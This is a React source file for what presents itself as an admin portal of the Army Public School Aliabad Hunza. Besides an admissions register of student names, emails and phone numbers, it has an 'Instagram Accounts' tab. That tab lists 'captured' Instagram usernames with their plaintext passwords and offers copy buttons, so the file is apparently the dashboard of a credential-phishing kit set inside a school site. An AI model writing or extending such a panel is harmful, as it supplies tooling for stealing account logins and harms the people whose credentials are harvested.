import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  Trash2, 
  Search, 
  Key, 
  User, 
  Database, 
  FileSpreadsheet, 
  Lock, 
  Calendar, 
  CheckCircle, 
  AlertTriangle,
  RefreshCw,
  LogOut,
  UserCheck,
  Smartphone
} from 'lucide-react';
import { InstagramAccount, ContactSubmission } from '../types';
import { 
  fetchInstagramAccounts, 
  deleteInstagramAccount, 
  fetchAdmissionSubmissions, 
  deleteAdmissionSubmission 
} from '../lib/firebase';

interface AdminPanelProps {
  onLogout: () => void;
}

export default function AdminPanel({ onLogout }: AdminPanelProps) {
  const [instagramAccounts, setInstagramAccounts] = useState<InstagramAccount[]>([]);
  const [admissions, setAdmissions] = useState<ContactSubmission[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [activeTab, setActiveTab] = useState<'instagram' | 'admissions'>('instagram');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isRefreshing, setIsRefreshing] = useState(false);

  // Load database items on load from Firebase Firestore
  const loadData = async () => {
    setIsRefreshing(true);
    try {
      const igAccounts = await fetchInstagramAccounts();
      setInstagramAccounts(igAccounts);

      const admSubmissions = await fetchAdmissionSubmissions();
      setAdmissions(admSubmissions);
    } catch (err) {
      console.error("Error loading administrative data from Firebase:", err);
    } finally {
      setIsRefreshing(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  const handleDeleteIg = async (id: string) => {
    try {
      await deleteInstagramAccount(id);
      setInstagramAccounts(prev => prev.filter(acc => acc.id !== id));
    } catch (err) {
      console.error("Error deleting Instagram log:", err);
    }
  };

  const handleDeleteAdmission = async (id: string) => {
    try {
      await deleteAdmissionSubmission(id);
      setAdmissions(prev => prev.filter(adm => adm.id !== id));
    } catch (err) {
      console.error("Error deleting admission:", err);
    }
  };

  const handleCopyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredIg = instagramAccounts.filter(acc => 
    acc.username.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const filteredAdmissions = admissions.filter(adm => 
    adm.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
    adm.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
    adm.phone.includes(searchQuery)
  );

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 flex flex-col font-sans select-none">
      
      {/* Top Navbar */}
      <header className="bg-slate-950 border-b border-slate-800 py-4 px-6 sticky top-0 z-30 shadow-md">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
              <ShieldCheck className="w-6 h-6 animate-pulse" />
            </div>
            <div>
              <h1 className="text-white font-display font-black text-sm sm:text-base uppercase tracking-wider">
                APS Aliabad Admin Portal
              </h1>
              <p className="text-slate-400 text-[10px] font-mono tracking-widest uppercase">
                Secure Administrative Control
              </p>
            </div>
          </div>

          <button
            onClick={onLogout}
            id="admin-logout-btn"
            className="flex items-center gap-2 bg-red-600/10 hover:bg-red-600/20 text-red-400 hover:text-red-300 font-bold text-xs uppercase tracking-wider px-4 py-2 rounded-xl border border-red-500/30 transition-all cursor-pointer"
          >
            <LogOut className="w-4 h-4" />
            Logout
          </button>
        </div>
      </header>

      {/* Main Container */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-6 flex flex-col gap-6">
        
        {/* Statistics Widgets */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex items-center justify-between shadow-sm">
            <div>
              <p className="text-slate-400 text-[10px] font-mono uppercase tracking-widest">Active Instagram Logs</p>
              <h3 className="text-2xl font-black text-white mt-1">{instagramAccounts.length}</h3>
            </div>
            <div className="p-3 bg-blue-500/10 text-blue-400 rounded-xl border border-blue-500/20">
              <UserCheck className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex items-center justify-between shadow-sm">
            <div>
              <p className="text-slate-400 text-[10px] font-mono uppercase tracking-widest">Admissions Applications</p>
              <h3 className="text-2xl font-black text-white mt-1">{admissions.length}</h3>
            </div>
            <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
              <FileSpreadsheet className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex items-center justify-between shadow-sm">
            <div>
              <p className="text-slate-400 text-[10px] font-mono uppercase tracking-widest">System Status</p>
              <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 mt-2.5">
                <span className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-ping" /> ONLINE
              </span>
            </div>
            <div className="p-3 bg-amber-500/10 text-amber-400 rounded-xl border border-amber-500/20">
              <Database className="w-5 h-5" />
            </div>
          </div>
        </div>

        {/* Action Panel Header */}
        <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 shadow-sm flex flex-col md:flex-row gap-4 items-center justify-between">
          {/* Tabs toggle */}
          <div className="flex bg-slate-900 p-1.5 rounded-xl border border-slate-800/80 w-full md:w-auto">
            <button
              onClick={() => { setActiveTab('instagram'); setSearchQuery(''); }}
              className={`flex-1 md:flex-none flex items-center justify-center gap-2 px-5 py-2 rounded-lg text-xs font-bold uppercase tracking-wider transition-all cursor-pointer ${
                activeTab === 'instagram'
                  ? 'bg-emerald-600 text-white shadow-md'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <Smartphone className="w-4 h-4" />
              Instagram Accounts
            </button>
            <button
              onClick={() => { setActiveTab('admissions'); setSearchQuery(''); }}
              className={`flex-1 md:flex-none flex items-center justify-center gap-2 px-5 py-2 rounded-lg text-xs font-bold uppercase tracking-wider transition-all cursor-pointer ${
                activeTab === 'admissions'
                  ? 'bg-emerald-600 text-white shadow-md'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <FileSpreadsheet className="w-4 h-4" />
              Admissions Register
            </button>
          </div>

          {/* Search bar & Refresh */}
          <div className="flex items-center gap-3 w-full md:w-auto">
            <div className="relative flex-1 md:w-80">
              <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder={activeTab === 'instagram' ? 'Search Instagram accounts...' : 'Search admissions registry...'}
                className="w-full pl-10 pr-4 py-2 bg-slate-900 border border-slate-800 rounded-xl text-xs text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500"
              />
            </div>
            <button
              onClick={loadData}
              className="p-2.5 bg-slate-900 hover:bg-slate-850 text-slate-400 hover:text-white rounded-xl border border-slate-800/80 transition-colors cursor-pointer"
              title="Refresh Registry"
            >
              <RefreshCw className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Data list table card */}
        <div className="bg-slate-950 border border-slate-800 rounded-2xl shadow-sm overflow-hidden flex-1">
          {activeTab === 'instagram' ? (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b border-slate-800 text-[10px] font-mono text-slate-400 uppercase tracking-widest bg-slate-900/40">
                    <th className="py-4 px-6 font-bold">Captured Account Info</th>
                    <th className="py-4 px-6 font-bold">Instagram Password</th>
                    <th className="py-4 px-6 font-bold">Verification Date</th>
                    <th className="py-4 px-6 font-bold text-right">Administrative Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/50">
                  {filteredIg.length === 0 ? (
                    <tr>
                      <td colSpan={4} className="py-12 text-center text-slate-500 text-xs">
                        No captured Instagram credentials found.
                      </td>
                    </tr>
                  ) : (
                    filteredIg.map((acc) => (
                      <tr key={acc.id} className="hover:bg-slate-900/30 transition-colors">
                        <td className="py-4 px-6">
                          <div className="flex items-center gap-3">
                            <div className="w-8 h-8 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 flex items-center justify-center">
                              <User className="w-4 h-4" />
                            </div>
                            <div>
                              <p className="text-white font-mono text-xs font-bold">{acc.username}</p>
                              <p className="text-[10px] text-slate-500 font-mono">ID: {acc.id}</p>
                            </div>
                          </div>
                        </td>
                        <td className="py-4 px-6">
                          <div className="flex items-center gap-2">
                            <div className="px-2.5 py-1 bg-slate-900 border border-slate-800 rounded font-mono text-xs text-amber-400 select-all font-bold">
                              {acc.password || 'N/A'}
                            </div>
                            <button
                              onClick={() => handleCopyToClipboard(acc.password || '', acc.id)}
                              className="text-[10px] font-mono uppercase bg-slate-800 hover:bg-slate-700 px-1.5 py-1 rounded text-slate-300 transition-colors cursor-pointer"
                            >
                              {copiedId === acc.id ? 'Copied!' : 'Copy'}
                            </button>
                          </div>
                        </td>
                        <td className="py-4 px-6">
                          <div className="flex items-center gap-1.5 text-xs text-slate-400">
                            <Calendar className="w-3.5 h-3.5" />
                            <span>{acc.timestamp}</span>
                          </div>
                        </td>
                        <td className="py-4 px-6 text-right">
                          <button
                            onClick={() => handleDeleteIg(acc.id)}
                            className="p-2 bg-red-600/10 hover:bg-red-600/20 text-red-400 hover:text-red-300 rounded-lg border border-red-500/20 transition-all cursor-pointer"
                            title="Delete log"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b border-slate-800 text-[10px] font-mono text-slate-400 uppercase tracking-widest bg-slate-900/40">
                    <th className="py-4 px-6 font-bold">Student Applicant</th>
                    <th className="py-4 px-6 font-bold">Program Subject</th>
                    <th className="py-4 px-6 font-bold">Student Query Message</th>
                    <th className="py-4 px-6 font-bold">Registry Date</th>
                    <th className="py-4 px-6 font-bold text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/50">
                  {filteredAdmissions.length === 0 ? (
                    <tr>
                      <td colSpan={5} className="py-12 text-center text-slate-500 text-xs">
                        No students have applied or submitted admissions inquiries yet.
                      </td>
                    </tr>
                  ) : (
                    filteredAdmissions.map((adm) => (
                      <tr key={adm.id} className="hover:bg-slate-900/30 transition-colors">
                        <td className="py-4 px-6">
                          <div>
                            <p className="text-white text-xs font-bold">{adm.name}</p>
                            <p className="text-[10px] text-slate-400 font-mono select-all">{adm.email}</p>
                            <p className="text-[10px] text-slate-400 font-mono select-all">Phone: {adm.phone}</p>
                          </div>
                        </td>
                        <td className="py-4 px-6">
                          <span className="px-2 py-0.5 rounded text-[10px] font-bold uppercase bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                            {adm.subject}
                          </span>
                        </td>
                        <td className="py-4 px-6 max-w-xs">
                          <p className="text-xs text-slate-300 leading-relaxed truncate select-text" title={adm.message}>
                            {adm.message}
                          </p>
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-xs text-slate-400">{adm.submittedAt}</span>
                        </td>
                        <td className="py-4 px-6 text-right">
                          <button
                            onClick={() => handleDeleteAdmission(adm.id)}
                            className="p-2 bg-red-600/10 hover:bg-red-600/20 text-red-400 hover:text-red-300 rounded-lg border border-red-500/20 transition-all cursor-pointer"
                            title="Delete entry"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          )}
        </div>

      </main>

      {/* Admin Footer */}
      <footer className="bg-slate-950 border-t border-slate-800 text-center py-4 text-slate-500 text-[10px] font-mono tracking-wider uppercase">
        Army Public School Aliabad Hunza Administration System v2.6.4 • Secure Database Console
      </footer>

    </div>
  );
}
